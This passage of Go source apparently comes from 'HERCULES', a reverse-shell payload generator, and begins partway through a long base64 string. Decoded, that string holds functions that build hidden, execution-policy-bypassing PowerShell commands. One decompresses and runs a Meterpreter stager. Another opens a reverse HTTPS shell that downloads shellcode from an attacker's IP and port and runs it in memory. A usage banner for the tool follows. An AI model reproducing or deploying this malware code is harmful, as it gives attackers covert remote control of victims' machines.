Gxpc3RlbmluZyBmb3IgZmlsZSBhdCA1NTg4OCBwb3J0DQoNCg0KDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQpgDQoNCg0KDQoNCmZ1bmMgQ1JFQVRFX1BTX01FVEVSUFJFVEVSKEVuY29kZWRDb21wcmVzc2VkQnVmZmVyIHN0cmluZykgKHN0cmluZykgew0KICANCg0KDQp2YXIgU2hlbGxfVGVtcGxhdGUgc3RyaW5nID0gYEBlY2hvIG9mZg0KaWYgJVBST0NFU1NPUl9BUkNISVRFQ1RVUkUlPT14ODYgKHBvd2Vyc2hlbGwuZXhlIC1Ob1AgLU5vbkkgLVcgSGlkZGVuIC1FeGVjIEJ5cGFzcyAtQ29tbWFuZCAiSW52b2tlLUV4cHJlc3Npb24gJChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlciAoJChOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCQoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0gKCwkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyhcImArRW5jb2RlZENvbXByZXNzZWRCdWZmZXIrYFwiKSkpKSwgW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSwgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkpLlJlYWRUb0VuZCgpOyIpIGVsc2UgKCVXaW5EaXIlXHN5c3dvdzY0XHdpbmRvd3Nwb3dlcnNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUV4ZWMgQnlwYXNzIC1Db21tYW5kICJJbnZva2UtRXhwcmVzc2lvbiAkKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyICgkKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbSAoJChOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSAoLCQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKFwiYCtFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcitgXCIpKSkpLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IikNCg0KYA0KDQogIHJldHVybiBTaGVsbF9UZW1wbGF0ZTsNCg0KfQ0KDQoNCmZ1bmMgUkVWRVJTRV9IVFRQU19TSEVMTChJUF9QT1JUIHN0cmluZykgKHN0cmluZykgey8vbCwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlKGJhc2U2NFRleHQsIFtdYnl0ZShtZXNzYWdlKSkNCiAgDQoNCg0KUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzLCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoYEpIRWdQU0JBSWcwS1cwUnNiRWx0Y0c5eWRDZ2lhMlZ5Ym1Wc016SXVaR3hzSWlsZElIQjFZbXhwWXlCemRHRjBhV01nWlhoMFpYSnUNCklFbHVkRkIwY2lCV2FYSjBkV0ZzUVd4c2IyTW9TVzUwVUhSeUlHeHdRV1JrY21WemN5d2dkV2x1ZENCa2QxTnBlbVVzSUhWcGJuUWcNClpteEJiR3h2WTJGMGFXOXVWSGx3WlN3Z2RXbHVkQ0JtYkZCeWIzUmxZM1FwT3cwS1cwUnNiRWx0Y0c5eWRDZ2lhMlZ5Ym1Wc016SXUNClpHeHNJaWxkSUhCMVlteHBZeUJ6ZEdGMGFXTWdaWGgwWlhKdUlFbHVkRkIwY2lCRGNtVmhkR1ZVYUhKbFlXUW9TVzUwVUhSeUlHeHcNClZHaHlaV0ZrUVhSMGNtbGlkWFJsY3l3Z2RXbHVkQ0JrZDFOMFlXTnJVMmw2WlN3Z1NXNTBVSFJ5SUd4d1UzUmhjblJCWkdSeVpYTnoNCkxDQkpiblJRZEhJZ2JIQlFZWEpoYldWMFpYSXNJSFZwYm5RZ1pIZERjbVZoZEdsdmJrWnNZV2R6TENCSmJuUlFkSElnYkhCVWFISmwNCllXUkpaQ2s3RFFvaVFBMEtkSEo1ZXlSa0lEMGdJa0ZDUTBSRlJrZElTVXBMVEUxT1QxQlJVbE5VVlZaWFdGbGFZV0pqWkdWbVoyaHANCmFtdHNiVzV2Y0hGeWMzUjFkbmQ0ZVhvd01USXpORFUyTnpnNUlpNVViME5vWVhKQmNuSmhlU2dwRFFwbWRXNWpkR2x2YmlCaktDUjINCktYc2djbVYwZFhKdUlDZ29XMmx1ZEZ0ZFhTQWtkaTVVYjBOb1lYSkJjbkpoZVNncElId2dUV1ZoYzNWeVpTMVBZbXBsWTNRZ0xWTjENCmJTa3VVM1Z0SUNVZ01IZ3hNREFnTFdWeElEa3lLWDBOQ21aMWJtTjBhVzl1SUhRZ2V5Um1JRDBnSWlJN01TNHVNM3htYjNKbFlXTm8NCkxXOWlhbVZqZEhza1ppczlJQ1JrV3loblpYUXRjbUZ1Wkc5dElDMXRZWGhwYlhWdElDUmtMa3hsYm1kMGFDbGRmVHR5WlhSMWNtNGcNCkpHWTdmUTBLWm5WdVkzUnBiMjRnWlNCN0lIQnliMk5sYzNNZ2UxdGhjbkpoZVYwa2VDQTlJQ1I0SUNzZ0pGOTlPeUJsYm1RZ2V5UjQNCklId2djMjl5ZEMxdlltcGxZM1FnZXlodVpYY3RiMkpxWldOMElGSmhibVJ2YlNrdWJtVjRkQ2dwZlgxOURRcG1kVzVqZEdsdmJpQm4NCmV5Qm1iM0lnS0NScFBUQTdKR2tnTFd4MElEWTBPeVJwS3lzcGV5Um9JRDBnZERza2F5QTlJQ1JrSUh3Z1pUc2dJR1p2Y21WaFkyZ2cNCktDUnNJR2x1SUNScktYc2tjeUE5SUNSb0lDc2dKR3c3SUdsbUlDaGpLQ1J6S1NrZ2V5QnlaWFIxY200Z0pITWdmWDE5Y21WMGRYSnUNCklDSTVkbGhWSWp0OURRcGJUbVYwTGxObGNuWnBZMlZRYjJsdWRFMWhibUZuWlhKZE9qcFRaWEoyWlhKRFpYSjBhV1pwWTJGMFpWWmgNCmJHbGtZWFJwYjI1RFlXeHNZbUZqYXlBOUlIc2tkSEoxWlgwN0pHMGdQU0JPWlhjdFQySnFaV04wSUZONWMzUmxiUzVPWlhRdVYyVmkNClEyeHBaVzUwT3cwS0pHMHVTR1ZoWkdWeWN5NUJaR1FvSW5WelpYSXRZV2RsYm5RaUxDQWlUVzk2YVd4c1lTODBMakFnS0dOdmJYQmgNCmRHbGliR1U3SUUxVFNVVWdOaTR4T3lCWGFXNWtiM2R6SUU1VUtTSXBPeVJ1SUQwZ1p6c2dXMEo1ZEdWYlhWMGdKSEFnUFNBa2JTNUUNCmIzZHViRzloWkVSaGRHRW9JbWgwZEhCek9pOHZZQ3R6ZEhKcGJtY29TVkJmVUU5U1ZDa3JZQzhrYmlJZ0tRMEtKRzhnUFNCQlpHUXQNClZIbHdaU0F0YldWdFltVnlSR1ZtYVc1cGRHbHZiaUFrY1NBdFRtRnRaU0FpVjJsdU16SWlJQzF1WVcxbGMzQmhZMlVnVjJsdU16SkcNCmRXNWpkR2x2Ym5NZ0xYQmhjM04wYUhKMURRb2tlRDBrYnpvNlZtbHlkSFZoYkVGc2JHOWpLREFzSkhBdVRHVnVaM1JvTERCNE16QXcNCk1Dd3dlRFF3S1R0YlUzbHpkR1Z0TGxKMWJuUnBiV1V1U1c1MFpYSnZjRk5sY25acFkyVnpMazFoY25Ob1lXeGRPanBEYjNCNUtDUncNCkxDQXdMQ0JiU1c1MFVIUnlYU2drZUM1VWIwbHVkRE15S0NrcExDQWtjQzVNWlc1bmRHZ3BEUW9rYnpvNlEzSmxZWFJsVkdoeVpXRmsNCktEQXNNQ3drZUN3d0xEQXNNQ2tnZkNCdmRYUXRiblZzYkRzZ1UzUmhjblF0VTJ4bFpYQWdMVk5sWTI5dVpDQTROalF3TUgxallYUmoNCmFIdDlgKQ0KDQogIEluZGV4IDo9IHN0cmluZ3MuUmVwbGFjZShzdHJpbmcoUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzKSwgIitzdHJpbmcoSVBfUE9SVCkrIiwgSVBfUE9SVCwgLTEpDQoNCg0KICByZXR1cm4gc3RyaW5nKEluZGV4KQ0KDQp9DQo=`
var LINUX_PAYLOAD string = ``
var OSX_PAYLOAD string = ``




var HELP string = `

                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   

############################ HERCULES REVERSE SHELL ############################



Usage : ./HERCULES <Local Ip> <Local Port> <options>


Options : 

      -p                 Payload to use. ( Windows / Linux / OSX )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )


`

